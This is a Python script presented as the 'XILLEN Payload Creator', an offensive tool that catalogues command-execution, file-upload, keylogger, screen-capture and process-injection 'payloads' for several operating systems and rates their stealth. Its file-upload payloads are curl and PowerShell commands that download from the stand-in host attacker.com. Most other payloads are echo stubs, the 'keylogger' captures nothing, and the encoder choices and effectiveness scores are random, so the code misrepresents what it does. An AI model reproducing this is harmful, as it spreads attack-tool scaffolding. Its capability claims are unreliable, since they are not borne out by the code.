#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import platform
import json
import random
from pathlib import Path

class PayloadCreator:
    def __init__(self):
        self.payloads = []
        self.encoders = []
        self.targets = []
        
    def analyze_target_systems(self):
        print("[+] Analyzing target systems...")
        
        targets = [
            {"os": "Windows", "arch": "x64", "shell": "cmd.exe", "payload_type": "executable"},
            {"os": "Windows", "arch": "x86", "shell": "cmd.exe", "payload_type": "executable"},
            {"os": "Linux", "arch": "x64", "shell": "/bin/bash", "payload_type": "script"},
            {"os": "Linux", "arch": "x86", "shell": "/bin/bash", "payload_type": "script"},
            {"os": "macOS", "arch": "x64", "shell": "/bin/zsh", "payload_type": "script"}
        ]
        
        for target in targets:
            self.targets.append(target)
            print(f"    [+] Target: {target['os']} {target['arch']}")
            
    def generate_payload_types(self):
        print("[+] Generating payload types...")
        
        payload_categories = [
            {
                "name": "Command Execution",
                "description": "Executes system commands",
                "complexity": "LOW",
                "detection_rate": "HIGH"
            },
            {
                "name": "File Upload",
                "description": "Uploads files to target system",
                "complexity": "MEDIUM",
                "detection_rate": "MEDIUM"
            },
            {
                "name": "Keylogger",
                "description": "Captures keystrokes",
                "complexity": "HIGH",
                "detection_rate": "LOW"
            },
            {
                "name": "Screen Capture",
                "description": "Takes screenshots",
                "complexity": "MEDIUM",
                "detection_rate": "MEDIUM"
            },
            {
                "name": "Process Injection",
                "description": "Injects code into running processes",
                "complexity": "HIGH",
                "detection_rate": "LOW"
            }
        ]
        
        for category in payload_categories:
            for target in self.targets:
                payload = self.create_payload(category, target)
                self.payloads.append(payload)
                
        print(f"    [+] Generated {len(self.payloads)} payloads")
        
    def create_payload(self, category, target):
        payload = {
            "name": category["name"],
            "target_os": target["os"],
            "target_arch": target["arch"],
            "description": category["description"],
            "complexity": category["complexity"],
            "detection_rate": category["detection_rate"],
            "shell": target["shell"],
            "payload_type": target["payload_type"],
            "code": self.generate_payload_code(category["name"], target),
            "encoder": self.select_encoder(category["complexity"])
        }
        
        return payload
        
    def generate_payload_code(self, payload_type, target):
        if payload_type == "Command Execution":
            if target["os"] == "Windows":
                return f'cmd.exe /c "echo {payload_type} executed"'
            else:
                return f'{target["shell"]} -c "echo {payload_type} executed"'
        elif payload_type == "File Upload":
            if target["os"] == "Windows":
                return 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/file -OutFile C:\\temp\\file"'
            else:
                return 'curl -o /tmp/file http://attacker.com/file'
        elif payload_type == "Keylogger":
            if target["os"] == "Windows":
                return 'powershell -c "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait(\'test\')"'
            else:
                return 'xdotool type "test"'
        else:
            return f'echo "Payload: {payload_type}"'
            
    def select_encoder(self, complexity):
        if complexity == "LOW":
            return random.choice(["None", "Base64"])
        elif complexity == "MEDIUM":
            return random.choice(["XOR", "ROT13", "Base64"])
        else:
            return random.choice(["Custom", "AES", "RSA"])
            
    def analyze_payload_effectiveness(self):
        print("[+] Analyzing payload effectiveness...")
        
        for payload in self.payloads:
            payload["effectiveness_score"] = self.calculate_effectiveness(payload)
            payload["stealth_rating"] = self.calculate_stealth(payload)
            
    def calculate_effectiveness(self, payload):
        score = 50
        
        if payload["complexity"] == "HIGH":
            score += 30
        elif payload["complexity"] == "MEDIUM":
            score += 20
            
        if payload["encoder"] != "None":
            score += 20
            
        return min(score, 100)
        
    def calculate_stealth(self, payload):
        if payload["detection_rate"] == "LOW":
            return "HIGH"
        elif payload["detection_rate"] == "MEDIUM":
            return "MEDIUM"
        else:
            return "LOW"
            
    def generate_payload_report(self):
        print("\n===============================================")
        print("    Payload Creator Report")
        print("===============================================")
        
        print(f"Target systems: {len(self.targets)}")
        print(f"Payloads created: {len(self.payloads)}")
        
        if self.targets:
            print("\nTarget Systems:")
            for target in self.targets:
                print(f"OS: {target['os']}")
                print(f"   Architecture: {target['arch']}")
                print(f"   Shell: {target['shell']}")
                print(f"   Payload Type: {target['payload_type']}")
                print()
                
        if self.payloads:
            print("\nGenerated Payloads:")
            for payload in self.payloads:
                print(f"Name: {payload['name']}")
                print(f"   Target: {payload['target_os']} {payload['target_arch']}")
                print(f"   Complexity: {payload['complexity']}")
                print(f"   Detection Rate: {payload['detection_rate']}")
                print(f"   Effectiveness: {payload.get('effectiveness_score', 'N/A')}/100")
                print(f"   Stealth: {payload.get('stealth_rating', 'N/A')}")
                print(f"   Encoder: {payload['encoder']}")
                print(f"   Code: {payload['code']}")
                print()
                
        self.save_report()
        
    def save_report(self):
        report_file = "payload_creator_report.json"
        
        report_data = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "author": "@Bengamin_Button",
            "team": "@XillenAdapter",
            "platform": platform.system(),
            "targets": self.targets,
            "payloads": self.payloads,
            "summary": {
                "total_targets": len(self.targets),
                "total_payloads": len(self.payloads)
            }
        }
        
        try:
            with open(report_file, 'w') as f:
                json.dump(report_data, f, indent=2)
            print(f"[+] Report saved to: {report_file}")
        except Exception as e:
            print(f"[-] Error saving report: {e}")
            
    def run_payload_creation(self):
        print("===============================================")
        print("    XILLEN Payload Creator")
        print("    Создание полезных нагрузок")
        print("===============================================")
        print("Author: @Bengamin_Button")
        print("Team: @XillenAdapter")
        print()
        
        self.analyze_target_systems()
        print()
        
        self.generate_payload_types()
        print()
        
        self.analyze_payload_effectiveness()
        print()
        
        self.generate_payload_report()

def main():
    creator = PayloadCreator()
    creator.run_payload_creation()

if __name__ == "__main__":
    main()
